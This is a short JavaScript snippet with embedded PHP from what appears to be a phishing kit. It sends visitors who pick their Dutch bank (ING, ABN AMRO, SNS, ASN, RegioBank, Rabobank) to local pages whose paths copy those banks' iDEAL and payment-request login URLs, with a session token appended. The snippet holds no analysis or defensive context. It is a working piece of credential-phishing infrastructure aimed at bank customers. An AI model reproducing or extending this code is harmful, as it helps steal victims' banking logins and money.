<script>

const button = document.querySelector('#account-login-button');
const select = document.querySelector('#account-select-name');

button.addEventListener('click', e => {
    e.preventDefault();
    if (select.value === 'ing') {
        window.location.href = '/particulier/betaalverzoek/inloggen/<?php echo $_SESSION['url'];?>';
    } else if (select.value === 'abn') {
        window.location.href = '/portalserver/nl/prive/bankieren/inloggen/<?php echo $_SESSION['url'];?>';
    } else if (select.value === 'sns') {
        window.location.href = '/online/betalen-ideal/inloggen/<?php echo $_SESSION['url'];?>';
    } else if (select.value === 'asn') {
        window.location.href = '/online/betalen-asn/inloggen/<?php echo $_SESSION['url'];?>';
    } else if (select.value === 'regio') {
        window.location.href = '/online/betalen-regio/inloggen/<?php echo $_SESSION['url'];?>';
    } else if (select.value === 'rabo') {
        window.location.href = '/ideal-betalen/inloggen/<?php echo $_SESSION['url'];?>';
    }
});

</script>
